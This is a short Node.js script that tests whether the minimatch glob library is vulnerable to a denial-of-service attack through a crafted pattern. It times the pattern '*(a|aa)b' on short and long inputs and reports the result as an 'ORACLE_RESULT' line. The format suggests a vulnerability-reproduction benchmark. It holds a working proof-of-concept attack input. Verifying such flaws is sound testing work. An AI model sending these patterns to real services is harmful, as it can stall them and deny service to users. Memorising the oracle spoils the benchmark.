const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint()) / 1e6;
}

function timeMatch(pattern, input, rounds) {
  let total = 0;
  let last = null;
  for (let i = 0; i < rounds; i++) {
    const t0 = nowMs();
    last = minimatch(input, pattern);
    total += (nowMs() - t0);
  }
  return { avgMs: total / rounds, last };
}

try {
  const benign = minimatch('index.js', '*.js');
  if (benign !== true) {
    throw new Error('benign call failed');
  }

  operation_completed = true;

  const pattern = '*(a|aa)b';
  const smallInput = 'a'.repeat(24);
  const largeInput = 'a'.repeat(240);

  const small = timeMatch(pattern, smallInput, 3);
  const large = timeMatch(pattern, largeInput, 3);

  const ratio = large.avgMs / Math.max(0.01, small.avgMs);

  const absoluteSlow = large.avgMs > 8;
  const superLinear = ratio > 10;

  exploit_succeeded = Boolean(absoluteSlow && superLinear);
  evidence = JSON.stringify({
    benign_ok: true,
    pattern,
    small_len: smallInput.length,
    large_len: largeInput.length,
    small_avg_ms: Number(small.avgMs.toFixed(4)),
    large_avg_ms: Number(large.avgMs.toFixed(4)),
    ratio: Number(ratio.toFixed(3)),
    thresholds: { large_avg_ms_gt: 8, ratio_gt: 10 },
    outputs: { small: small.last, large: large.last }
  });
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));